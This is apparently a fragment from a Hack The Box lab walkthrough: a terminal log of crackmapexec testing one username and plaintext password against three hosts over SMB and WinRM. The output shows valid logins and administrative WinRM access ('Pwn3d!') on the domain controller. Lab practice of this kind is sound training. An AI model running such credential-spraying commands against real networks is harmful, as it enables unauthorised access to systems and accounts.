
```rust
❯ crackmapexec smb ips.txt -u 'aepike' -p 'LandIAtErOUs'                                                                                                    
SMB         172.16.0.32     445    WS01             [*] Windows 10.0 Build 19041 x64 (name:WS01) (domain:WS01) (signing:False) (SMBv1:False)                
SMB         172.16.0.33     445    WS02             [*] Windows 10.0 Build 19041 x64 (name:WS02) (domain:WS02) (signing:False) (SMBv1:False)                
SMB         172.16.0.2      445    DC               [*] Windows Server 2012 R2 Standard 9600 x64 (name:DC) (domain:alchemy.htb) (signing:True) (SMBv1:True) 
SMB         172.16.0.32     445    WS01             [-] WS01\aepike:LandIAtErOUs STATUS_LOGON_FAILURE                                                       
SMB         172.16.0.33     445    WS02             [+] WS02\aepike:LandIAtErOUs                                                                            
SMB         172.16.0.2      445    DC               [+] alchemy.htb\aepike:LandIAtErOUs                                                                     
❯ crackmapexec winrm ips.txt -u 'aepike' -p 'LandIAtErOUs'                                                                                                  
SMB         172.16.0.2      5985   DC               [*] Windows 6.3 Build 9600 (name:DC) (domain:alchemy.htb)                                               
SMB         172.16.0.32     5985   WS01             [*] Windows 10.0 Build 19041 (name:WS01) (domain:WS01)                                                  
SMB         172.16.0.33     5985   WS02             [*] Windows 10.0 Build 19041 (name:WS02) (domain:WS02)                                                  
HTTP        172.16.0.2      5985   DC               [*] http://172.16.0.2:5985/wsman                                                                        
HTTP        172.16.0.32     5985   WS01             [*] http://172.16.0.32:5985/wsman                                                                       
HTTP        172.16.0.33     5985   WS02             [*] http://172.16.0.33:5985/wsman                                                                       
WINRM       172.16.0.2      5985   DC               [+] alchemy.htb\aepike:LandIAtErOUs (Pwn3d!)                                                            
WINRM       172.16.0.32     5985   WS01             [-] WS01\aepike:LandIAtErOUs                                                                            
WINRM       172.16.0.33     5985   WS02             [-] WS02\aepike:LandIAtErOUs                                                                            

```